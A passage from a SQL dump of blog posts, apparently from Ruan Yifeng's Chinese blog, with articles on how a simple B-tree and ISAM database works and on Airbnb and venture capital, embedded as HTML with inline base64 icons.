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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://memoryhere.com/?utm_source=ruanyifeng.com" style="border: none;" target="_blank">生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-10-27 09:15:48', '2014-07-04 07:04:08', 0, '[["\\u8282\\u70b9", 0.30045177791178834], ["\\u6570\\u636e\\u5e93", 0.2766244662675], ["\\u67e5\\u627e", 0.20660079270043796], ["\\u8bfb\\u53d6", 0.16218601031233576], ["\\u7d22\\u5f15", 0.1355555786150365], ["\\u6570\\u636e", 0.1221514479880657], ["\\u786c\\u76d8", 0.11208521174233577], ["\\u4e8c\\u53c9", 0.10582201239963504], ["\\u64cd\\u4f5c", 0.10052592977864963], ["\\u8bb0\\u5f55", 0.09472288054058395], ["ISAM", 0.08726107666350365], ["\\u4e3b\\u952e", 0.0723039989310219], ["\\u9700\\u8981", 0.07135095947354014], ["16", 0.06544580749762774], ["SQL", 0.06544580749762774], ["100", 0.06544580749762774], ["\\u4e2a\\u503c", 0.06544580749762774], ["\\u59d3\\u540d", 0.06529761373777372], ["\\u5bb9\\u7eb3", 0.06033494926138686], ["\\u76ee\\u6807\\u503c", 0.05712559351751825]]', NULL, NULL, '所有应用软件之中，数据库可能是最复杂的。\n\n        MySQL的手册有3000多页，PostgreSQL的手册有2000多页，Oracle的手册更是比它们相加还要厚。\n\n\n\n但是，自己写一个最简单的数据库，做起来并不难。Reddit上面有一个帖子，只用了几百个字，就把原理讲清楚了。下面是我根据这个帖子整理的内容。\n\n一、数据以文本形式保存\n\n第一步，就是将所要保存的数据，写入文本文件。这个文本文件就是你的数据库。\n\n为了方便读取，数据必须分成记录，每一条记录的长度规定为等长。比如，假定每条记录的长度是800字节，那么第5条记录的开始位置就在3200字节。\n\n大多数时候，我们不知道某一条记录在第几个位置，只知道主键（primary key）的值。这时为了读取数据，可以一条条比对记录。但是这样做效率太低，实际应用中，数据库往往采用B树（B-tree）格式储存数据。\n\n二、什么是B树？\n\n要理解B树，必须从二叉查找树（Binary search tree）讲起。\n\n\n\n二叉查找树是一种查找效率非常高的数据结构，它有三个特点。\n\n\n  （1）每个节点最多只有两个子树。\n\n（2）左子树都为小于父节点的值，右子树都为大于父节点的值。\n\n（3）在n个节点中找到目标值，一般只需要log(n)次比较。\n\n\n二叉查找树的结构不适合数据库，因为它的查找效率与层数相关。越处在下层的数据，就需要越多次比较。极端情况下，n个数据需要n次比较才能找到目标值。对于数据库来说，每进入一层，就要从硬盘读取一次数据，这非常致命，因为硬盘的读取时间远远大于数据处理时间，数据库读取硬盘的次数越少越好。\n\nB树是对二叉查找树的改进。它的设计思想是，将相关数据尽量集中在一起，以便一次读取多个数据，减少硬盘操作次数。\n\n\n\nB树的特点也有三个。\n\n\n  （1）一个节点可以容纳多个值。比如上图中，最多的一个节点容纳了4个值。\n\n（2）除非数据已经填满，否则不会增加新的层。也就是说，B树追求"层"越少越好。\n\n（3）子节点中的值，与父节点中的值，有严格的大小对应关系。一般来说，如果父节点有a个值，那么就有a+1个子节点。比如上图中，父节点有两个值（7和16），就对应三个子节点，第一个子节点都是小于7的值，最后一个子节点都是大于16的值，中间的子节点就是7和16之间的值。\n\n\n这种数据结构，非常有利于减少读取硬盘的次数。假定一个节点可以容纳100个值，那么3层的B树可以容纳100万个数据，如果换成二叉查找树，则需要20层！假定操作系统一次读取一个节点，并且根节点保留在内存中，那么B树在100万个数据中查找目标值，只需要读取两次硬盘。\n\n三、索引\n\n数据库以B树格式储存，只解决了按照"主键"查找数据的问题。如果想查找其他字段，就需要建立索引（index）。\n\n所谓索引，就是以某个字段为关键字的B树文件。假定有一张"雇员表"，包含了员工号（主键）和姓名两个字段。可以对姓名建立索引文件，该文件以B树格式对姓名进行储存，每个姓名后面是其在数据库中的位置（即第几条记录）。查找姓名的时候，先从索引中找到对应第几条记录，然后再从表格中读取。\n\n这种索引查找方法，叫做"索引顺序存取方法"（Indexed Sequential Access Method），缩写为ISAM。它已经有多种实现（比如C-ISAM库和D-ISAM库），只要使用这些代码库，就能自己写一个最简单的数据库。\n\n四、高级功能\n\n部署了最基本的数据存取（包括索引）以后，还可以实现一些高级功能。\n\n（1）SQL语言是数据库通用操作语言，所以需要一个SQL解析器，将SQL命令解析为对应的ISAM操作。\n\n（2）数据库连接（join）是指数据库的两张表通过"外键"，建立连接关系。你需要对这种操作进行优化。\n\n（3）数据库事务（transaction）是指批量进行一系列数据库操作，只要有一步不成功，整个操作都不成功。所以需要有一个"操作日志"，以便失败时对操作进行回滚。\n\n（4）备份机制：保存数据库的副本。\n\n（5）远程操作：使得用户可以在不同的机器上，通过TCP/IP协议操作数据库。\n\n（完）\n\n        文档信息\n\n版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证）\n发表日期： 2014年7月 4日\n更多内容：  档案  » \n  理解计算机 \n\n付费支持： 购买文集\n社交媒体： twitter， weibo\nFeed订阅： \n\n        \n        [广告]　生命链记忆网是永远在线的个人史馆，是永恒的信息载体，永久保留每个人的人生记忆和生命轨迹直至千秋万代。\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(19, 'http://www.ruanyifeng.com/blog/2014/06/airbnb.html', 'Airbnb与创投', '<p>最近，网上有一篇文章<a href="http://tech.sina.com.cn/zl/post/detail/i/2014-06-23/pid_8455437.htm">《黑暗创投圈》</a>引起了争论，<a href="http://tech.sina.com.cn/zl/post/detail/i/2014-06-26/pid_8455681.htm">新浪科技</a>的杜丹编辑向我约稿，谈谈对它的看法。</p>\n\n        <p>那篇文章抨击了国内创投圈的乱象，感慨国内缺乏导师型的创投，多的是职业投资人出身的创投。这导致了一方面，投资人像评估银行贷款一样地评估创业项目；另一方面，创业者日益重视项目的包装和概念，而忽视"内功"。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/airbnb2.jpg" title="" /></p>\n\n<p>一定程度上，我同意那篇文章的观点，确实感到国内很多创投，不善于孵化和培育项目，只是一个单纯的出资者的角色。更糟的是，往往投钱以后，创投就深度介入项目开发，主导产品方向，逼迫创业者采纳他们的观点，不顾自己其实对技术知之甚少。大多数时候，这种做法只会起到反作用。</p>\n\n<p>这让我想起StackOverflow的创始人Joel Spolsky，在<a href="http://www.ruanyifeng.com/docs/mjos/">《软件随想录》</a>中举过的一个<a href="http://book.51cto.com/art/200911/165070.htm">例子</a>。</p>\n\n<blockquote>\n  <p>19世纪的时候，在俄国的一个小村庄里，住着一个贫穷的犹太人。有一天，他遇到了一个骑着马的哥萨克人 。</p>\n\n<p>"你用什么喂鸡？"哥萨克人问。</p>\n\n<p>"就用一点面包屑。"犹太人回答。</p>\n\n<p>"你好大的胆子，竟敢用这么低等的饲料喂俄国鸡！"哥萨克人说，拿起棍子打犹太人。</p>\n\n<p>第二天，哥萨克人又来了。"现在，你用什么喂鸡？"他问犹太人。</p>\n\n<p>"报告大人，我给它上三道大菜，分别是新割下的鲜草，上等的鲟鱼鱼子酱，还有一小碗鲜奶油，上面还洒着进口的法国松露巧克力作为甜食。"</p>\n\n<p>"白痴！"哥萨克人说，拿起棍子打犹太人，"你好大的胆子，竟敢在低等的家禽身上浪费这么好的食物！"</p>\n\n<p>第三天，哥萨克人又来问："你用什么喂鸡？"</p>\n\n<p>"不喂了！"犹太人禀告，"我给它一个铜板，它想吃什么就自个儿去买。"</p>\n</blockquote>\n\n<p>在我看来，很多国内创投就像上面故事里的哥萨克人，他们其实不知道怎么把事情做好，只是下命令，让创业者自己想办法解决问题。真正优秀的创投，应该起到一个指路人的作用，帮助创业团队把项目做对、做大、做好。</p>\n\n<p><a href="https://www.airbnb.com/">Airbnb</a>就是一个很好的例子，它2009年出自美国最著名的创业孵化器YC。今年4月刚刚完成4.5亿美元的B轮投资，目前估值为100亿美元。可以说，它是历史上最成功的创业公司之一。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/airbnb.jpg" title="" /></p>\n\n<p>就是这样一家明星公司，曾经令美国两大创投产生过严重分歧。YC创始人<a href="http://www.paulgraham.com/airbnb.html">Paul Graham</a>坚决看好，而纽约风险投资家<a href="http://avc.com/2011/03/airbnb/">Fred Wilson</a>则表示怀疑。我觉得，这是一个绝佳的例子，可以说明一个优秀的创投可以发挥多大的作用。</p>\n\n<p>Fred Wilson之所以不看好Airbnb，是因为他是投资银行出身，使用传统眼光评价。在他看来，首先，Airbnb的两个创始人都是设计系毕业，缺乏软件背景；其次，他们在旧金山过得穷困潦倒，连房租都付不出；第三，只因为某次会议导致旅馆紧张，他们靠出租自己的公寓赚了一笔，居然就觉得可以创办一个类似Ebay的专门出租公寓的网站。这怎么可能成功呢？况且，就算有人将自己的公寓放上他们的网站，也可以放到其他网站啊！</p>\n\n<p>Paul Graham是程序员出身，看问题的眼光，与投资家出身的创投完全不同。他最看中的不是令人叫好的项目或者创意，而是创业者的素质。因为一个优秀的创业者，可以将坏点子变成好点子，将好点子变成可以出售的产品。在他看来，Airbnb的两个创业者有着非凡的创造力和执行力，这远比Airbnb的创意本身重要。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/airbnb_boxes_01.jpg" title="" /></p>\n\n<p>一个例证是，2008年正赶上美国总统大选，Airbnb的创始人灵机一动，将奥巴马和麦凯恩的卡通形象，分别印在500个包装盒上，里面装入燕麦片，每一盒都有一个独一无二的编号，然后拿到民主党和共和党的全国代表大会出售，每盒售价40美元。最后居然赚了30000美元，这比当时Airbnb得到的天使投资都要多。<a href="https://www.airbnb.com/obamaos">这件事</a>给Paul Graham留下深刻印象，从此认定Airbnb这个项目会成功。</p>\n\n<p>后来，Fred Wilson公开承认，错过Airbnb是他风投生涯中最大的错误。他说道：</p>\n\n<blockquote>\n  <p>"<strong>我太关注他们那时正在做的事情，而忽视了他们做过的、将做的、有能力做的事情。</strong>"\n（We focused too much on what they were doing at the time and not enough on what they could do, would do, and did do.）</p>\n</blockquote>\n\n<p>这句话就是我心目中，优秀的创投应该具备的素质。他看出创业者的潜质，提供各种条件，鼓励和支持他们发挥自己的潜力，为项目出谋划策，帮助形成概念、评估架构、推广产品，将一颗种子扶植成小树苗，进而拥有了长成参天大树的无限可能。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-06-26T15:01:20+08:00">2014年6月26日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/startup/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 创业</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img 